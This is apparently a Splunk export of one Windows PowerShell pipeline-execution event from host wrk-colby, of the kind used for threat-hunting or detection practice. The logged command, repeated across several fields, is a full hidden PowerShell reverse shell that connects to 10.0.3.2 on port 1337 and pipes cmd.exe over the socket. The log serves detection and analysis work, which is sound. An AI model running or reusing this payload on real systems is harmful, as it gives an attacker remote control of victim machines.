"Account_Domain","Account_Name",ActivityID,Archived,AuthenticationPackageName,CallTrace,CallerProcessName,"Caller_Computer_Name","Caller_Domain","Caller_Logon_ID","Caller_Machine_Name","Caller_User_Name",Category,CategoryString,"Change_Type",Channel,ClientInfo,"Client_Address","Client_Domain","Client_Logon_ID","Client_Machine_Name","Client_User_Name","CommandInvocation_Invoke_WebRequest_","CommandInvocation_New_Object_","CommandInvocation_Start_Sleep_",CommandLine,CommandName,CommandPath,CommandType,Company,Computer,ComputerName,Consumer,Contents,"Context_Information",CreationUtcTime,CurrentDirectory,Description,Destination,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,DetailSequence,DetailTotal,Details,DisabledPrivilegeList,Domain,ElevatedToken,EnabledPrivilegeList,EngineVersion,"Error_Code",EventChannel,EventCode,"EventData_Xml",EventDescription,EventID,EventIdentifier,EventRecordID,EventType,FileName,FileVersion,Filter,GrantedAccess,"Group_Domain","Group_Name","Group_Type_Change",Guid,Hash,Hashes,HostApplication,HostId,HostName,HostVersion,IMPHASH,Image,ImageLoaded,"Image_File_Name",ImpersonationLevel,Initiated,IntegrityLevel,IpAddress,IpPort,IsExecutable,KeyFilePath,KeyLength,Keywords,Level,LmPackageName,"LogFileCleared_Xml",Logfile,LogonGuid,LogonId,LogonProcessName,LogonType,"Logon_Account","Logon_ID","Logon_Type","Logon_account",MD5,MandatoryLabel,MemberName,"Member_ID","Member_Name",Message,Name,NewEngineState,NewProcessId,NewProcessName,NewProviderState,"New_Account_Name","New_Domain",ObjectName,Opcode,OriginalComputerName,OriginalFileName,"ParameterBinding_Invoke_WebRequest_","ParameterBinding_New_Object_","ParameterBinding_Start_Sleep_",ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentProcessName,ParentUser,PipeName,PipelineId,PreviousEngineState,"Primary_Domain","Primary_User_Name",PrivilegeList,ProcessGuid,ProcessID,ProcessId,ProcessName,"Process_Command_Line",Product,Protocol,ProviderName,QueryName,QueryResults,QueryStatus,RecordID,RecordNumber,"RenderingInfo_Xml",RestrictedAdminMode,RuleName,RunspaceId,SHA1,SHA256,ScriptName,SecurityID,"Security_ID",SequenceNumber,Signature,SignatureStatus,Signed,SourceHostname,SourceImage,SourceIp,SourceIsIpv6,SourceName,SourcePort,SourcePortName,SourceProcessGUID,SourceProcessId,SourceThreadId,SourceUser,"Source_Network_Address","Source_Port","Source_Workstation",Status,SubStatus,SubjectDomainName,SubjectLogonId,SubjectUserName,SubjectUserSid,"Supplied_Realm_Name",SystemTime,"System_Props_Xml",TargetDomainName,TargetFilename,TargetImage,TargetLinkedLogonId,TargetLogonId,TargetObject,TargetOutboundDomainName,TargetOutboundUserName,TargetProcessGUID,TargetProcessId,TargetProcessName,TargetServerName,TargetUser,TargetUserName,TargetUserSid,"Target_Account_ID","Target_Account_Name","Target_Domain","Target_Server_Name","Target_User_Name",Task,TerminalSessionId,ThreadID,TimeCreated,TimeGenerated,TimeWritten,TokenElevationType,"Token_Elevation_Type","Token_Elevation_Type_id",TransmittedServices,Type,User,"UserData_Xml",UserID,UserId,"User_ID","User_Name",UtcTime,Version,VirtualAccount,Workstation,WorkstationName,"Workstation_Name","_raw","_time",a,action,answer,"answer_count",app,"authentication_method",b,body,c,category,"change_type","creation_time","date_hour","date_mday","date_minute","date_month","date_second","date_wday","date_year","date_zone",description,dest,"dest_host","dest_ip","dest_nt_domain","dest_port",direction,dvc,"dvc_ip","dvc_nt_host",e,eb,es,esread,"event_id",eventtype,"file_access_time","file_create_time","file_hash","file_modify_time","file_name","file_path","granted_access",host,"http_referrer","http_referrer_domain",id,index,is,linecount,"loaded_file","loaded_file_path",name,nb,"new_process","new_process_id","new_process_name",ob,object,"object_attrs","object_category","object_id","object_path","original_file_name",os,osread,p,"p_StartInfo_FileName","p_StartInfo_RedirectStandardError","p_StartInfo_RedirectStandardInput","p_StartInfo_RedirectStandardOutput","p_StartInfo_UseShellExecute","parent_process","parent_process_exec","parent_process_guid","parent_process_id","parent_process_name","parent_process_path","pipe_name",process,"process_command_line_arguments","process_command_line_process","process_current_directory","process_exec","process_guid","process_hash","process_id","process_integrity_level","process_name","process_path",product,protocol,"protocol_version",punct,q,query,"query_count",r,"record_type","record_type_id","registry_hive","registry_key_name","registry_path","registry_value_data","registry_value_name","registry_value_type","reply_code_id",result,rule,s,service,"service_dll_signature_exists","service_dll_signature_verified","service_id","service_name","service_signature_exists","service_signature_verified","session_id",severity,"severity_id",signature,"signature_id",source,sourcetype,"splunk_server","splunk_server_group",src,"src_address","src_function","src_host","src_ip","src_module","src_nt_domain","src_port","src_user","src_user_name",state,status,str,subject,"ta_windows_action","ta_windows_security_CategoryString","ta_windows_status",tag,"tag::Logon_Type","tag::Token_Elevation_Type_id","tag::app","tag::eventtype",timeendpos,timestamp,timestartpos,transport,"transport_dest_port","uri_path",url,"url_domain","url_length",user,"user_group","user_group_id","user_id","user_name","user_type",value,vendor,"vendor_privilege","vendor_product","wmi_type"
,,,,,,,,,,,,8,"Pipeline Execution Details",,,,,,,,,,,"""Start-Sleep""","$a='10.0.3.2'",,,,,,"wrk-colby",,,,,,,,,,,,,1,1,,,,,,"5.1.19041.5007",,,800,,,,800,,3,,,,,,,,,,,powershell,"9f22d0b4-93e5-4f66-b839-ecfef3509fef",ConsoleHost,"5.1.19041.5007",,,,,,,,,,,,,,,,,"Windows PowerShell",,,,,,,,,,,,,,"Pipeline execution details for command line: $a='10.0.3.2';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }}. 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=2165

	UserId=ECORP\tcolby
	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=9f22d0b4-93e5-4f66-b839-ecfef3509fef
	HostApplication=powershell -w hidden -nop -c $a='10.0.3.2';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }}
	EngineVersion=5.1.19041.5007
	RunspaceId=330b52de-b875-47a7-99cd-bc97670779b1
	PipelineId=1
	ScriptName=
	CommandLine=$a='10.0.3.2';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }} 

Details: 
CommandInvocation(Start-Sleep): ""Start-Sleep""
ParameterBinding(Start-Sleep): name=""Milliseconds""; value=""100""",,,,,,,,,,"wrk-colby.Ecorp.local",,,,"name=""Milliseconds""; value=""100""",,,,,,,,1,,,,,,,,,,,,,,,,,445200,,,,"330b52de-b875-47a7-99cd-bc97670779b1",,,,,,2165,,,,,,,,PowerShell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20241013153959.100954-000","20241013153959.100954-000",,,,,Information,NULL,,,"ECORP\tcolby",,,,,,,,,"20241013083959.000000
Category=8
CategoryString=Pipeline Execution Details
EventCode=800
EventIdentifier=800
EventType=3
Logfile=Windows PowerShell
RecordNumber=445200
SourceName=PowerShell
TimeGenerated=20241013153959.100954-000
TimeWritten=20241013153959.100954-000
Type=Information
User=NULL
ComputerName=wrk-colby
OriginalComputerName=wrk-colby.Ecorp.local
wmi_type=WinEventLog:Windows PowerShell
Message=Pipeline execution details for command line: $a='10.0.3.2';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }}. 

Context Information: 
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=2165

	UserId=ECORP\tcolby
	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=9f22d0b4-93e5-4f66-b839-ecfef3509fef
	HostApplication=powershell -w hidden -nop -c $a='10.0.3.2';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }}
	EngineVersion=5.1.19041.5007
	RunspaceId=330b52de-b875-47a7-99cd-bc97670779b1
	PipelineId=1
	ScriptName=
	CommandLine=$a='10.0.3.2';$b=1337;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }} 

Details: 
CommandInvocation(Start-Sleep): ""Start-Sleep""
ParameterBinding(Start-Sleep): name=""Milliseconds""; value=""100""

","2024-10-13T08:39:59.000-0700","'10.0.3.2'",,,,,,1337,,"New-Object system.net.sockets.tcpclient",,,,8,13,39,october,59,sunday,2024,local,,,,,,,,,,,"new-object System.Text.UTF8Encoding","New-Object System.Byte[] 65536","$p.StandardError","$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null)",,"wmi_windows",,,,,,,,"wrk-colby",,,,main,"$p.StandardInput",40,,,Milliseconds,"New-Object System.Byte[] $c.ReceiveBufferSize",,,,"New-Object System.Byte[] 65536",,,,,,,"$p.StandardOutput","$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null)","New-Object System.Diagnostics.Process","'cmd.exe'",1,1,1,0,,,,,,,,,,,,,,,,,,,,,,".\r=\r=__\r=\r=\r=\r=_\r=\r=\r=.-\r=.-\r=\r=\r=-\r=-..\r=:_\r=____","$p.Start()",,,"$os.BaseStream.EndRead($osread)",,,,,,,,,,,,"$c.GetStream()",,,,,,,,,,,,,"WMI:WinEventLog:Windows PowerShell","WMI:WinEventLog:Windows PowerShell","wrk-colby",,,,,,,,,,,,,,"$e.GetString($nb,0,$r)",,,,,"os
windows",,,,"os
windows",23,,0,,,,,,,,,,,,,100,,,,"WinEventLog:Windows PowerShell"
